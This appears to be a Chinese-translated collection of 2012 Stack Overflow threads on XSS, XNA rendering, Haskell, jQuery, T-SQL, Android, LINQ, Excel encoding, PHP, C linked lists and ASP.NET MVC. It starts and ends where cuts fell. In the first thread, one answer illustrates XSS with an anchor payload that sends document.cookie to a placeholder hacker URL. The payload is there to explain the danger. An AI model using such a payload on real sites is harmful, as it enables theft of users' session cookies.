该报告明确提到使用 PrintWriter 是有害的，并且容易出现 XSS（跨站点脚本）。如果这是一个潜在的威胁，我尝试在网上搜索，但找不到任何有用的东西。请告知这是否是一个问题以及我的替代方案是什么。

编辑 - 使用**out.println**语句发现问题

谢谢，悉达多

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:12:08.373

XSS 它是一个潜在的威胁。[在这里](https://www.owasp.org/index.php/Cross-site_Scripting_%28XSS%29)，您将找到有关它的信息并解决有关 XSS 漏洞的问题。

**更新**：

我还[提到](https://www.owasp.org/index.php/Category%3aOWASP_Top_Ten_Project)了十大 OWASP 漏洞。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:16:37.340

你可以在网上找到很多关于 XSS 的信息，但很少有人非常详细地介绍如何测试和避免它。这是需要进行一些研究的事情之一。让我给你一个例子，你提供的代码可能是也可能不是问题的原因。

假设您的 HTML 页面对后端进行了 ajax 调用，然后您返回结果。成功后我只是给你一个jquery示例

`$.each(data, function(){
$('div.result').append(this);
);`

您会注意到数据只是在没有验证的情况下附加的。如果数据来自脚本小子并输入怎么办

```
//this might not be the correct syntax
<a href="http://somehackerurl.com/hack.php?"+document.cookie>test</a> 
```

由于您没有验证您的输入，用户可以输入任何内容，上面的代码将窃取点击链接的人的 cookie。

希望这可以帮助

# c# - 在 XNA 的 3 个数组中只看到 1 个对象

> ID：10114646
> 
> 赞同：0
> 
> 时间：2012-04-11T22:05:52.050
> 
> 标签：c#, arrays, xna, draw

谁能看到我在这里出错的地方。

我有一个具有模型和位置的 CameraObject 类（它不是相机，只是表示“相机”的框的模型）。它还具有常用的 LoadContent()、Draw() 和 Update() 方法。但是，当我绘制模型数组时，我只在屏幕上看到 1 个模型（嗯，可能有 3 个，但它们可能都在同一个位置）？

CameraModel 类的 Draw() 方法如下所示：

```
public void Draw(Matrix view, Matrix projection) 
    { 
        transforms = new Matrix[CameraModel.Bones.Count]; 
        CameraModel.CopyAbsoluteBoneTransformsTo(transforms); 

        // Draw the model 
        foreach(ModelMesh myMesh in CameraModel.Meshes) 
        { 
            foreach (BasicEffect myEffect in myMesh.Effects) 
            { 
                myEffect.World = transforms[myMesh.ParentBone.Index]; 
                myEffect.View = view; 
                myEffect.Projection = projection; 

                myEffect.EnableDefaultLighting(); 
                myEffect.SpecularColor = new Vector3(0.25f); 
                myEffect.SpecularPower = 16; 
            } 
            myMesh.Draw(); 
        } 
    } 
```

然后在我的 Game1 类中，我创建了一个 CameraObject 对象数组：

```
CameraObject[] cameraObject = new CameraObject[3]; 
```

我 Initialize() - 所以每个新对象应该与前一个对象相差 +10

```
for (int i = 0; i < cameraObject.Length; i++) 
        { 
            cameraObject[i] = new CameraObject(); 
            cameraObject[i].Position = new Vector3(i * 10, i * 10, i * 10); 
        } 
```

最后是 Draw()

```
Matrix view = camera.viewMatrix; 
Matrix projection = camera.projectionMatrix; 

for (int i = 0; i < cameraObject.Length; i++) 
{ 
    cameraObject[i].Draw(view, projection); 
} 
```

视图和投影来自我的 Camera() 类，如下所示：

```
viewMatrix = Matrix.Identity; 
projectionMatrix = Matrix.CreatePerspectiveFieldOfView(MathHelper.ToRadians(45.0f), 16 / 9, .5f, 500f); 
```

但我只看到 1 个对象被绘制到屏幕上？我已经逐步完成了代码，一切看起来都很好，但我不知道为什么我看不到 3 个对象？

谁能发现我哪里出错了？

这是我的 Camera() 类中 UpdateViewMatrix 的代码：

```
private void UpdateViewMatrix(Matrix chasedObjectsWorld)
    {
        switch (currentCameraMode)
        {
            case CameraMode.free:
                // To be able to rotate the camera and and not always have it looking at the same point
                // Normalize the cameraRotation’s vectors, as those are the vectors that the camera will rotate around
                cameraRotation.Forward.Normalize();
                cameraRotation.Up.Normalize();
                cameraRotation.Right.Normalize();

                // Multiply the cameraRotation by the Matrix.CreateFromAxisAngle() function, 
                // which rotates the matrix around any vector by a certain angle
                // Rotate the matrix around its own vectors so that it works properly no matter how it’s rotated already
                cameraRotation *= Matrix.CreateFromAxisAngle(cameraRotation.Right, pitch);
                cameraRotation *= Matrix.CreateFromAxisAngle(cameraRotation.Up, yaw);
                cameraRotation *= Matrix.CreateFromAxisAngle(cameraRotation.Forward, roll);

                // After the matrix is rotated, the yaw, pitch, and roll values are set back to zero
                yaw = 0.0f;
                pitch = 0.0f;
                roll = 0.0f;

                // The target is changed to accommodate the rotation matrix
                // It is set at the camera’s position, and then cameraRotation’s forward vector is added to it
                // This ensures that the camera is always looking in the direction of the forward vector, no matter how it’s rotated
                target = Position + cameraRotation.Forward;

                break;

            case CameraMode.chase:
                // Normalize the rotation matrix’s forward vector because we’ll be using that vector to roll around
                cameraRotation.Forward.Normalize();
                chasedObjectsWorld.Right.Normalize();
                chasedObjectsWorld.Up.Normalize();

                cameraRotation = Matrix.CreateFromAxisAngle(cameraRotation.Forward, roll);

                // Each frame, desiredTarget will be set to the position of whatever object we’re chasing
                // Then set the actual target equal to the desiredTarget, can then change the target’s X and Y coordinates at will
                desiredTarget = chasedObjectsWorld.Translation;
                target = desiredTarget;

                target += chasedObjectsWorld.Right * yaw;
                target += chasedObjectsWorld.Up * pitch;

                // Always want the camera positioned behind the object, 
                // desiredPosition needs to be transformed by the chased object’s world matrix
                desiredPosition = Vector3.Transform(offsetDistance, chasedObjectsWorld);

                // Smooth the camera’s movement and transition the target vector back to the desired target
                Position = Vector3.SmoothStep(Position, desiredPosition, .15f);

                yaw = MathHelper.SmoothStep(yaw, 0f, .1f);
                pitch = MathHelper.SmoothStep(pitch, 0f, .1f);
                roll = MathHelper.SmoothStep(roll, 0f, .1f);

                break;

            case CameraMode.orbit:
                // Normalizing the rotation matrix’s forward vector, and then cameraRotation is calculated
                cameraRotation.Forward.Normalize();

                //  Instead of yawing and pitching over cameraRotation’s vectors, we yaw and pitch over the world axes
                // By rotating over world axes instead of local axes, the orbiting effect is achieved
                cameraRotation = Matrix.CreateRotationX(pitch) * Matrix.CreateRotationY(yaw) * Matrix.CreateFromAxisAngle(cameraRotation.Forward, roll);

                desiredPosition = Vector3.Transform(offsetDistance, cameraRotation);
                desiredPosition += chasedObjectsWorld.Translation;
                Position = desiredPosition;

                target = chasedObjectsWorld.Translation;

                roll = MathHelper.SmoothStep(roll, 0f, .2f);

                break;
        }

        // Use this line of code to set up the View Matrix
        // Calculate the view matrix
        // The up vector is based on how the camera is rotated and not off the standard Vector3.Up
        // The view matrix needs an up vector to fully orient itself in 3D space, otherwise,
        // the camera would have no way of knowing whether or not it’s upside-down
        viewMatrix = Matrix.CreateLookAt(Position, target, cameraRotation.Up);
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-12T19:04:36.220

我没有在您的代码中看到您的 cameraObject[n].Position （这可能是唯一区分三个模型之间位置的唯一因素）正在影响 effect.World 属性。

```
effect.World = transforms[myMesh.ParentBone.Index]; 
```

通常不考虑单个模型的位置。

尝试这样的事情：

```
for (int i = 0; i < cameraObject.Length; i++) 
{ 
    cameraObject[i].Draw(view, projection, cameraObject[i].Position); 
} 

//later in the draw method
public void Draw(Matrix view, Matrix projection, Vector3 pos)
{
  // ...
  myEffect.World = transforms[myMesh.ParentBone.Index] * Matrix.CreateTranslation(pos);
  // ...
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-12T01:47:13.040

CameraObject[1] 和 [2] 位于比 camera[0] 更大的正 Z 值，并且视图矩阵位于原点并朝负 Z 方向看（请记住，视图矩阵是世界的倒置等价物矩阵）。与其将 viewMatrix 设置为 Matrix.Identity，不如将其设置为此，您可能会看到所有三个：

```
viewMatrix = Matrix.CreateLookAt(new Vector3(0,0,75), Vector3.Zero, Vector3.Up); 
```

# haskell - 在 Haskell 中克隆一个列表

> ID：10114653
> 
> 赞同：4
> 
> 时间：2012-04-11T22:06:33.110
> 
> 标签：haskell

有没有办法在 Haskell 中克隆一个列表？我找不到关于此的任何文档或关于 SO 的任何内容。如果没有人可以建议一个简单的实现方法吗？

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-04-11T22:08:29.777

Haskell 值是不可变的。“修改”列表只是将其转换为新列表；原始列表永远不会改变。因此，由于列表一开始就无法更改，因此无需克隆它们；您可以重复使用原始列表。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-11T22:09:04.273

像 Haskell 中的几乎所有数据类型一样，列表是不可变的，因此无需复制它们。

# jquery - jQuery 滑动面板 - 并排定位 Div。

> ID：10114658
> 
> 赞同：1
> 
> 时间：2012-04-11T22:06:55.060
> 
> 标签：jquery, html, css

我有一个应用程序向导，它应该可以滑动面板以显示简历应用程序的其他部分。这是我的网站： [http](http://atomicflowtech.com/portfolio/fmsresume/) ://atomicflowtech.com/portfolio/fmsresume/ 当您单击表单上的任意位置时，您可以看到我想要达到的效果，但是面板彼此位于下方，然后它们会向上滑动。任何线索如何解决这个问题？如果这个问题措辞不当，我很抱歉，我只是想不出如何更好地解释它，我认为这个例子不言自明。谢谢你的帮助！

我试图达到这个效果：http: [//jsfiddle.net/jtbowden/ykbgT/2/](http://jsfiddle.net/jtbowden/ykbgT/2/)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:14:25.383

链接有什么问题？

HTML：

```
<div id="container">
    <div id="box1" class="box">Div #1</div>
    <div id="box2" class="box">Div #2</div>
    <div id="box3" class="box">Div #3</div>
    <div id="box4" class="box">Div #4</div>
    <div id="box5" class="box">Div #5</div>
</div> 
```

CSS：

```
body {
    padding: 0px;    
}

#container {
    position: absolute;
    margin: 0px;
    padding: 0px;
    width: 100%;
    height: 100%;
    overflow: hidden;  
}

.box {
    position: absolute;
    width: 50%;
    height: 300px;
    line-height: 300px;
    font-size: 50px;
    text-align: center;
    border: 2px solid black;
    left: 150%;
    top: 100px;
    margin-left: -25%;
}

#box1 {
    background-color: green;
    left: 50%;
}

#box2 {
    background-color: yellow;
}

#box3 {
    background-color: red;
}

#box4 {
    background-color: orange;
}

#box5 {
    background-color: blue;
} 
```

JS：

```
$('.box').click(function() {

    $(this).animate({
        left: '-50%'
    }, 500, function() {
        $(this).css('left', '150%');
        $(this).appendTo('#container');
    });

    $(this).next().animate({
        left: '50%'
    }, 500);
});​ 
```

​ 你只需要改变内容，不是吗？​</p>

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:39:24.997

好像你只需要把那个容器浮起来。应该做的伎俩。让我知道事情的后续

# sql - TSQL RAND() 问题

> ID：10114665
> 
> 赞同：4
> 
> 时间：2012-04-11T22:07:31.113
> 
> 标签：sql, tsql, random, user-defined-functions

我正在尝试生成一个格式如下的字符串： 99-88-77 其中三个 2digit 数字是随机生成的。

我的 TSQL 有效：

```
declare @result nvarchar(50)
    DECLARE @counter smallint, @ci smallint, @cu smallint, @dc smallint

      SET @ci=RAND()*100
      SET @cu=RAND()*100
      SET @dc=RAND()*100

      --SET @counter = @counter + 1

   set @result = CAST(@ci AS varchar(2)) +'-'+CAST(@cu AS varchar(2))+'-'+CAST(@dc AS varchar(2))
   print @result 
```

生产（这次）：16-37-30

我需要为插入到表中的每条记录获取此字符串。

现在我想把它包装成一个函数，但显然我不能在 UDF 中使用 RAND() 。

使用插入语句时如何包装它来调用？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-11T22:25:51.413

您可以分两步进行。

首先，创建一个视图来生成你的随机数：

```
CREATE VIEW vRandNumber
AS
SELECT RAND() as RandNumber 
```

其次，创建您`UDF`从视图中提取的内容：

```
CREATE FUNCTION dbo.udfTest
(
)
RETURNS nvarchar(50)
AS
BEGIN

    DECLARE @result  nvarchar(50)
    DECLARE @counter smallint, @ci smallint, @cu smallint, @dc smallint

    SET @ci=(SELECT RandNumber FROM vRandNumber)*100
    SET @cu=(SELECT RandNumber FROM vRandNumber)*100
    SET @dc=(SELECT RandNumber FROM vRandNumber)*100

    set @result = CAST(@ci AS varchar(2)) +'-'+CAST(@cu AS varchar(2))+'-'+CAST(@dc AS varchar(2))

RETURN @result
END 
```

这将返回您刚刚请求的值。然后，当你想要你的价值时，你会得到你的随机答案：

```
SELECT dbo.udfTest() 
```

或者

```
INSERT INTO yourTable 
(
    randNumber
)
SELECT dbo.udfTest() 
```

我刚刚在 sql server 2005 中对此进行了测试，并且可以正常工作。

# android - android：我的软件不能以线性方式工作

> ID：10114668
> 
> 赞同：0
> 
> 时间：2012-04-11T22:07:54.123
> 
> 标签：android

我有这个代码

```
TextView B = (TextView)findViewById(R.id.txtMSG);
B.setText("Loading...");

Call_My_Func();

B.setText(""); 
```

我的功能`Call_My_Func()`工作了 1 分钟，但我可以看到消息**“正在加载...”**

java for android 中是否有`Application.DoEvent()`类似于我在 C# 中使用的东西？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:26:35.673

您没有看到该消息，因为您正在使用该长时间运行的调用阻塞 UI 线程（根据您的 DoEvent 评论，您似乎知道）。

将长时间运行的操作转移到另一个线程的简单方法是 Androids [AsyncTask](http://developer.android.com/reference/android/os/AsyncTask.html)。

# c# - MySql Linq-实体日期比较

> ID：10114670
> 
> 赞同：2
> 
> 时间：2012-04-11T22:08:02.437
> 
> 标签：c#, mysql, linq, entity-framework

我试图在 MySql 中执行以下操作，但得到一个不支持函数的 linq-to-entities 异常。我尝试使用 SqlFunctions.DateAdd 失败。到目前为止，唯一的解决方案是使用 ToList() 但这将所有这些都带到了我不喜欢的客户端：

```
var expiredPolcies = context.ApiUsagePolicies
    .Where(u => DateTime.UtcNow > u.UsagePolicyStart.AddSeconds(u.UsagePeriodSeconds)); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:22:20.600

[SqlFunctions](http://msdn.microsoft.com/en-us/library/system.data.objects.sqlclient.sqlfunctions.aspx)特定于实体框架和 SQL Server。

[SqlMethods](http://msdn.microsoft.com/en-us/library/system.data.linq.sqlclient.sqlmethods.aspx)特定于 Linq to SQL 和 SQL Server。

如果 MySql 有一组等效的方法，那么您可以使用它。

或者尝试重写您的查询，以便不涉及本地方法。尝试类似：

```
var expiredPolcies = context.ApiUsagePolicies
    .Where(u => 
        (DateTime.UtcNow - u.UsagePolicyStart).TotalSeconds > u.UsagePeriodSeconds); 
```

这完全取决于您的 Linq 提供程序支持哪些功能。

# macos - 导入文本文件时，mac excel 2011 修改“雀巢”

> ID：10114672
> 
> 赞同：0
> 
> 时间：2012-04-11T22:08:13.610
> 
> 标签：macos, excel, unicode, utf-8

如果我有一个仅包含单词“NESTLÉ”的文本文件，如何在 Excel 中打开它而不破坏重音？

据我所知，网站上的其他问题并没有完全涵盖这个问题。我看不出任何导入选项有任何区别。我尝试在导入 Excel 时告诉 Excel 它是 UTF-8，而最好的结果是 É => _.

如果我只用那个词创建一个 Google Docs 电子表格并将其保存为 Excel 格式，然后在 Excel 中打开，我会得到未损坏的数据，这很好，*可以*表示数据。

我从未见过 Excel 2011 在文件开头使用 UTF8 BOM 指示器做任何聪明的事情。

有没有其他人在那里有不同的经验，或者知道如何在没有任何中间翻译工具的情况下将这些数据从文本文件获取到 Excel？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T04:20:38.950

我以多种格式保存了包含该单词的文件。使用 Excel 2010 打开时，只需将相应的 .txt 文件拖放到其上即可：

**正确的**

> ANSI ¹（我的系统上的 Windows-1252 编码，即美国 Windows）
> UTF-8 带 BOM
> UTF-16BE 不带 BOM
> UTF-16LE 不带 BOM
> UTF-16LE 带 BOM

**不正确**

> 不带 BOM 的 UTF-8（结果 NESTLÃ‰）
> 带 BOM 的 UTF-16BE（结果 þÿNESTLÉ）

你知道你的文本文件的编码吗？*有趣的带有*BOM的 UTF-16BE失败了。Excel 可能正在使用启发式函数，例如[IsTextUnicode](http://msdn.microsoft.com/en-us/library/windows/desktop/dd318672%28v=vs.85%29.aspx)。

¹ Windows 上所谓的 ANSI 模式是一种特定于语言环境的编码。

# php - 合并自称函数的数组

> ID：10114681
> 
> 赞同：0
> 
> 时间：2012-04-11T22:09:04.203
> 
> 标签：php, youtube-api

所以我正在使用 Googles YouTube API，我想返回用户的所有订阅。
我已经构建了这个函数来获取订阅（最多 50 个），如果用户有超过 50 个订阅，则调用它自己来获取更多。

但我不知道如何合并每个函数调用中的数组。（见最后的while循环）。
由于它现在可以工作，新数组只会覆盖旧数组，但我尝试将数组添加到主数组并返回它，但这只会将数组放入其中。

foreach 循环返回一个如下所示的数组：

```
Array
(
    [0] => Array
        (
            [channelName] => break
            [channelLink] => https://www.youtube.com/channel/UClmmbesFjIzJAp8NQCtt8dQ
        )

    [1] => Array
        (
            [channelName] => kn0thing
            [channelLink] => https://www.youtube.com/channel/UClmmbesFjIzJAp8NQCtt8dQ
        )

    [2] => Array
        (
            [channelName] => EpicMealTime
            [channelLink] => https://www.youtube.com/channel/UClmmbesFjIzJAp8NQCtt8dQ
        )
) 
```

所以问题是while循环。有什么想法吗？

```
// Get an array with videos from a certain user
function getUserSubscriptions($username = false, $startIndex = 1, $maxResults = 50) {
    // if username is not set
    if(!$username) return false;

    // get users 50 first subscriptions
    // Use start-index to get the rest
    $ch = curl_init('https://gdata.youtube.com/feeds/api/users/'.$username.'/subscriptions?v=2&max-results='.$maxResults.'&start-index='.$startIndex);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    $subscriptionsXML = curl_exec($ch);
    curl_close($ch);

    // convert xml to array
    $subscriptionsArray = XMLtoArray($subscriptionsXML);

    // Ge total number of subscriptions
    $totalNumberOfSubscriptions = $subscriptionsArray['FEED']['OPENSEARCH:TOTALRESULTS'];

    // Parse array and clean it up
    $s = 0;
    $l = 0;
    foreach($subscriptionsArray['FEED']['ENTRY'] as $subscriptionArray) {

        // get link
        foreach($subscriptionArray['LINK'] as $channelLinks) {
            $channelLinkArray[$l] = $channelLinks;
            $l++;
        }
        // save all into a more beautiful array and return it
        $subscription[$s]['channelName'] = $subscriptionArray['YT:USERNAME']['DISPLAY'];
        $subscription[$s]['channelLink'] = $channelLinkArray[1]['HREF'];
        $s++;
    }

    // if we did not get all subscriptions, call the function again
    // but this time increase the startIndex
    while($totalNumberOfSubscriptions >= $startIndex) {
        $startIndex = $startIndex+$maxResults;
        $subscription = getUserSubscriptions($username, $startIndex);
    }
    return $subscription;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T22:21:25.247

问题似乎出在您进行递归调用时：

`$subscription = getUserSubscriptions($username, $startIndex);`

这似乎用返回的结果覆盖了订阅数组，所以你只会得到最后一个构建的数组。相反，您应该尝试合并数组：

`$subscription = array_merge( $subscription, getUserSubscriptions($username, $startIndex) );`

如果所有索引都是数字，这会将所有元素附加到数组的末尾。见： http: [//php.net/manual/en/function.array-merge.php](http://php.net/manual/en/function.array-merge.php)

# c - 分段错误，C 中的列表

> ID：10114684
> 
> 赞同：0
> 
> 时间：2012-04-11T22:09:11.133
> 
> 标签：c, sorting, linked-list, segmentation-fault

我尝试使用两个函数直接对我在链表中​​输入的数字进行排序，第一个在头部添加元素，第二个包含分段错误应该利用第一个来完成这项工作。

```
#include <stdio.h>
#include <stdlib.h>
typedef struct cellule
{
    int val;
    struct cellule *suivant;
} cellule;
typedef struct cellule* liste;

liste insert_tete(liste L,int n)
{

    liste p;

    p=malloc(sizeof(cellule));
    p->val=n;
    p->suivant=L;
    return p;
}//ok :)
liste insert_croissant(liste L,int n)
{
    if(!L)
    {
        L=insert_tete(L,n);
        return L;
    }

    liste p,q;
    for(q=L,p=L; (p!=NULL )&&(n> (p->val)) ; q=p,p=p->suivant); //

    p=insert_tete(p,n);
    q->suivant=p;
    return L;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T23:02:43.267

我绝不相信这会解决它，但您的代码中至少存在一个错误。

考虑 L 已初始化但 n < L->val 的情况：

```
// p = L, q = L;
// Let L = [val|->...
p=insert_tete(p,n);
// p = [n|->[val|->...
q->suivant=p;
// q = L
// Therefore [val|->[n|->L
// And you've just made your linked list circular. 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:46:58.330

```
liste insert_croissant(liste L,int n)
{
    if(!L)
    {
        L=insert_tete(L,n);
        return L;
    } 
```

在这里我们知道`L`不是`NULL`

```
 liste p,q;
    for(q=L,p=L; (p!=NULL )&&(n> (p->val)) ; q=p,p=p->suivant); // 
```

在这里获得合法段错误的唯一方法是，后面的指针之一`p`是一个非 0 指针，它没有指向正确分配的`struct cellule`，而是指向一些不可访问的内存。然后尝试访问`p->val`（或`p->suivant`）会导致段错误。

进入这种情况的最常见方法（以我有限的经验）是忘记将第一个指针初始化为 0。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T23:19:51.863

使用指针对指针的简化版本。注意：空列表没有特殊情况。

```
struct cellule {
    int val;
    struct cellule *suivant;
    };

struct cellule *insert_croissant(struct cellule **LL, int val)
{

    struct cellule *p,**pp;

    for(pp=LL  ; *pp && (*pp)->val < val ; pp = &(*pp)->suivant) {;}
      /* When we arrive here, pp points to whatever pointer happens
      ** to point to our current node.
      ** - If the list was empty, *pp==NULL
      ** - if the place to insert happens to be the tail of the list, *p is also NULL        
      ** - in all cases, *pp should be placed after the new node, and the new node's pointer should be assigned to *pp
      */
    p = malloc(sizeof *p);
    p->val = val;
    p->suivant = *pp;
    *pp = p;

    return *LL;

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T23:21:45.043

该代码存在列表在某些情况下可能会损坏的问题；很容易使列表进入未正确终止的状态（并且可能从列表中“丢失”节点）。这种情况可能会导致问题，具体取决于其他代码如何操作列表。

如果您尝试在不为空的列表上添加新节点，但新值小于或等于第一个节点的值，则列表最终将成为一个包含两个节点的循环列表。位于列表头部的节点之后的所有节点都将丢失。

发生这种情况是因为在这种情况下，两者`p`都会在被调用`q`时指向该节点。返回`insert_tete(p,n)`后，将指向链表头部的节点。所以当`insert_tete(p,n)``p-suivant``q`

```
q->suivant = p; 
```

执行时，列表将是循环的，“额外”节点将丢失。

根据您的其他操作如何作用于列表（尤其是如果/如何删除元素），您可能会发现自己在`suivant`字段中留下了一个悬空指针（这可能导致段错误），或者最终陷入无限循环。

# jquery - JQuery获取每个前一个元素的高度

> ID：10114687
> 
> 赞同：0
> 
> 时间：2012-04-11T22:09:23.907
> 
> 标签：jquery, jquery-selectors

我正在尝试找到一个好的解决方案来获得目标上方所有元素的高度。

所以循环`prev()`函数！关于如何处理的任何想法？

```
<div>
<div style="height:50px;width:100%"></div>
<div style="height:12px;width:100%"></div>
<div style="height:23px;width:100%"></div>
<div style="height:56px;width:100%"></div>
<div id="#mytarget"><p>HERE</p></div>
</div>

$('#mytarget').prev().each(function() {
    alert($(this).outerHeight());
}); 
```

它会开火`["56","23","12","50"]`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T22:17:09.493

`prev()`只给你*“直接在前面的兄弟姐妹”*，而
`prevAll`给你*“所有前面的兄弟姐妹”*。

```
$('#mytarget').prevAll().each(function() {
     alert($(this).outerHeight());
}); 
```

并删除`#`id 中的：

`<div id="#mytarget">`=>`<div id="mytarget">`

[**现场演示**](http://jsfiddle.net/W6jSJ/)

**文档：**

[`prevAll`](http://api.jquery.com/prevAll/)：

> 描述：获取匹配元素集中每个元素的**所有先前兄弟**，可选地由选择器过滤。

[`prev`](http://api.jquery.com/prev/)：

> 描述：获取匹配元素集中每个元素的**前一个兄弟**元素，可选地由选择器过滤

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T22:15:27.433

尝试[prevAll()](http://api.jquery.com/prevAll/)：

```
var result=[];
$('#mytarget').prevAll().each(function() {
    result.push($(this).outerHeight());
});
alert(result); 
```

也改变

```
<div id="#mytarget"><p>HERE</p></div> 
```

到：

```
<div id="mytarget"><p>HERE</p></div> 
```

演示：http: [//jsfiddle.net/JkDP6/](http://jsfiddle.net/JkDP6/)

# jquery - 循环遍历元素的宽度并显示元素，直到满足某个宽度

> ID：10114688
> 
> 赞同：1
> 
> 时间：2012-04-11T22:09:23.940
> 
> 标签：jquery

我在同一行上有一个徽标列表（静态）和一个页眉（此更改）。我想在页眉未占用的剩余空间中动态调整徽标（在空间中显示太多）。

方法：

*   首先隐藏徽标

1.) leftoverSpace = containerWdith - pageheaderWidth
2.) 循环遍历每个徽标宽度
3.) 一旦达到“leftoverSpace”数字，循环停止。

这就是我到目前为止所得到的：它不正确，但我正在尝试。

```
var pageheaderWidth = null;
brandsbannerWidth = null;
pageheaderWidth = $(".page_header h1").width()
pageheaderWidth = pageheaderWidth + 40;    

brandsWidth = (960-pageheaderWidth)-10

$(".brands_banner li").each (function(index) {

brandsbannerWidth = $(this).width();

if(brandsbannerWidth == brandsWidth) 

$(this).show();

}); 
```

帮助将不胜感激。提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T17:47:32.040

简单的溢出：隐藏正确地做到了。我有一些想法，溢出不会隐藏整个元素，只是其中的一部分。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T22:17:04.110

如果不查看您的代码，很难提供一个好的答案。

我会说你需要这样的东西：

```
var logos = $('.logos');

logos.hide();

$.each(logos, function () {

    var containerWidth = ...//define your variable here
    var pageheaderWidth = ...//define your variable here

    leftoverSpace = containerWidth - pageheaderWidth

    if (leftoverSpace == yourThresholdHere) {
         return false;
    }

    $(this).show();
}); 
```

* * *

**编辑**

现在查看您的编辑：

```
var pageheaderWidth = $(".page_header h1").width() + 40 //no need to declare it previously 
var brandsWidth = (960-pageheaderWidth)-10

$(".brands_banner li").each (function(index) {
      (condition here)
}); 
```

# extjs - 当服务器不返回数据时，如何防止extjs在保存操作后刷新模型

> ID：10114689
> 
> 赞同：1
> 
> 时间：2012-04-11T22:09:27.430
> 
> 标签：extjs

extjs 似乎期望在更新操作期间`model.save()`服务器将整个更新的对象返回给客户端，此时 extjs 用结果刷新本地模型。

```
 localRecord.set(serverRecord.data); 
```

但我的服务器在`update`. 如何防止 extjs 刷新本地模型？我更喜欢在一个被覆盖的代理中处理这个，因为它包含我所有的其他自定义代理设置。

# asp.net-mvc-3 - 为什么 ViewBag 中的一个项目没有传播到 _Layout 页面？

> ID：10114690
> 
> 赞同：0
> 
> 时间：2012-04-11T22:09:30.557
> 
> 标签：asp.net-mvc-3

我有一个 SiteNavigation 类，它在我的基本控制器的 Initialize 事件中被更新，例如

```
[Serializable]
public class SiteNavigation
{

    public SiteNavigation()
    {
        IsSummarySelected = true;
    }

    public Model.Dtos.Folder[] Folders { get; set; }

    public bool IsSummarySelected { get; set; }

}

protected override void Initialize(System.Web.Routing.RequestContext requestContext)
{
    base.Initialize(requestContext);

    var siteNavigation = new SiteNavigation();

    siteNavigation.Folders = GetMeMyFolders() as Folder[];

    ViewBag.SiteNavigation = siteNavigation;

} 
```

并且在控制器中 IsSummarySelected 属性更改为此值。

```
ViewBag.SiteNavigation.IsSummarySelected = false; 
```

当我使用这行代码访问 _Layout 文件中的属性时，该值始终为 true。就好像 nav 对象再次被新建并且构造函数将其设置为 true。

```
 @if (ViewBag.SiteNavigation.IsSummarySelected) 
```

我已经尝试将导航对象转换回变量并以这种方式设置属性，没有骰子。任何帮助，将不胜感激。

叫我莫名其妙！

谢谢你，斯蒂芬

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T22:32:09.963

我只是将您的代码复制粘贴到我的示例 mvc 项目中，并且在我的操作中正确更改 IsSummarySelected 反映在 _Layout 文件中。您确定您的控制器的分配受到打击，并且您不会在其他地方重新分配它吗？

**编辑：**您的问题是我认为将 ViewBag 用于本地化快速修复以外的任何事情的一个例子。调试动态全局对象并不好玩。重构建议：在基本控制器中创建站点导航属性

```
SiteNavigation siteNavigation;
public SiteNavigation SiteNavigation
{
    get
    {
       return siteNavigation;
    }
    set
    {
        siteNavigation = value;
    }
} 
```

并用这个替换所有对 ViewBag.SiteNavigation 的引用。然后创建一个自定义的 WebViewPage 并放入其中。

```
public SiteNavigation SiteNavigation
{
    get
    {
        return ((BaseController)ViewContext.Controller).SiteNavigation;
    }
} 
```

这不会解决您的问题，但现在您可以在 SiteNavigation 的 get 和 set 属性上粘贴断点，现在应该很容易调试您的问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-13T15:44:12.753

**我在调用过滤器**时填充我的*TempData["SplitterIsCollapsed"]*然后通过*OnResultExecuting*方法。此外，我从我的*UserContext*类中获取属性状态，每个会话仅注册一次：*builder.RegisterType().As().CacheInSession();* . 基本信息：我使用**DependcyInjection**！

 *******将过滤器分配给控制器：

**控制器：**

```
[LayoutTempData]
public class HomeController : Controller
{
    //....
} 
```

**过滤属性类：**

```
namespace MyProject.Web.Infrastructure.Filters
{
    public class LayoutTempDataAttribute : ActionFilterAttribute
    {
        private readonly IUserContext _userContext;
        public LayoutTempDataAttribute()
        {
            _userContext = DependencyResolver.Current.GetService<IUserContext>();
        }

        public override void OnResultExecuting(ResultExecutingContext context)
        {
            if (context.Controller.TempData.ContainsKey("SplitterIsCollapsed"))
                context.Controller.TempData["SplitterIsCollapsed"] = _userContext.LayoutInformation.SplitterIsCollapsed;
            else
                context.Controller.TempData.Add("SplitterIsCollapsed", _userContext.LayoutInformation.SplitterIsCollapsed);
        }
    }
} 
```

**_Layout.cshtml**的 Splitter 部分如下所示：

```
@{Html.Telerik().Splitter().Name("Splitter1")
    .Panes(panes =>
        {
            panes.Add()
                .Size("300px")
                .Collapsible(true)
                .Collapsed((bool)TempData["SplitterIsCollapsed"])
                .Content(<div>asdfasdf</div>);
            panes.Add()
                .Collapsible(false)
                .Scrollable(false)
                .Content(<div>content2</div>);
        })
     .Render();
 } 
```*******

# java - 如何解决这个线程阻塞问题

> ID：10114695
> 
> 赞同：0
> 
